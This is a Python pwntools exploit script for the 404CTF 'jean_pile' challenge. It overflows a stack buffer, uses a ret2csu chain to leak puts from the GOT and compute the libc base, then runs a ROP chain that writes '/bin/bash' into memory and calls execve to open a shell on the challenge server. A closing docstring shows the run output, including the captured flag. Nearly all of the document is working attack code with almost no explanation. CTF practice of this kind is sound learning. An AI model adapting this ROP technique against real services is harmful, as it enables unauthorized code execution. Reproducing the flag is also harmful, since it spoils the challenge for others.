from pwn import *

# exploit
init         = 0x400b7a
init_call    = 0x400b60
putsoffset   = 0x77980
execveoffset = 0xd4a10

debug = False
p = None

if debug:
    p = process('jean_pile')
else:
    p = remote('challenges.404ctf.fr', 31957)

p.recvuntil(b'>>> ')

# service 1
p.sendline(b'1')
p.recvuntil(b'>> ')

# send overflow to leak puts
payload = b"A"*0x30
payload+= p64(0x0602008+0x30)       # set RBP so RAX=>local_38,[RBP + -0x30]
payload+= p64(init)                 # RIP before fgets

payload+= p64(0)                    # RBX
payload+= p64(1)                    # RBP
payload+= p64(0x602018)             # R12 puts@got[plt]
payload+= p64(0x602018)             # R13 so leak puts@libc
payload+= p64(0x0)                  # R14
payload+= p64(0x0)                  # R15
payload+= p64(init_call)            # RIP call puts

payload+= p64(0x0)                  # ADD        RSP,0x8
payload+= p64(0)                    # RBX
payload+= p64(0x602200)             # RBP
payload+= p64(0x0)                  # R12
payload+= p64(0x0)                  # R13
payload+= p64(0x0)                  # R14
payload+= p64(0x0)                  # R15
payload+= p64(0x4006e0)             # back to _start

p.sendline(payload)

data = p.recv()

puts = data.split(b'\n')[0]
print(puts)
putslibc  = u64(puts + b"\x00"*(8-len(puts)))
print(putslibc)
libcbase = putslibc - putsoffset
execve   = libcbase + execveoffset

poprdx   = libcbase + 0xfddfd
poprax   = libcbase + 0x3f197
poprdi   = libcbase + 0x277e5
poprsi   = libcbase + 0x28f99
movrax   = libcbase + 0x353ac # mov qword ptr [rdx], rax ; ret

p.recvuntil(b'>>> ')

# service 1
p.sendline(b'1')
p.recvuntil(b'>> ')

# shell
payload = b"A"*0x30
payload+= p64(0x602200) # rbp
payload+= p64(poprdx)
payload+= p64(0x602300)
payload+= p64(poprax)
payload+= b"/bin/bas"
payload+= p64(movrax)
payload+= p64(poprdx)
payload+= p64(0x602308)
payload+= p64(poprax)
payload+= b"h"+b"\x00"*7
payload+= p64(movrax)
payload+= p64(poprdi)
payload+= p64(0x602300)
payload+= p64(poprsi)
payload+= p64(0x0)
payload+= p64(poprdx)
payload+= p64(0x0)
payload+= p64(execve)

p.sendline(payload)

p.interactive()

"""
$ python3 exploit_jeanpile.py
[+] Opening connection to challenges.404ctf.fr on port 31957: Done
0x7fb2ede67000
[*] Switching to interactive mode
$ id
uid=65534 gid=65534 groups=65534
$ cat flag.txt
404CTF{f4n_2_8denn3u}$ 
"""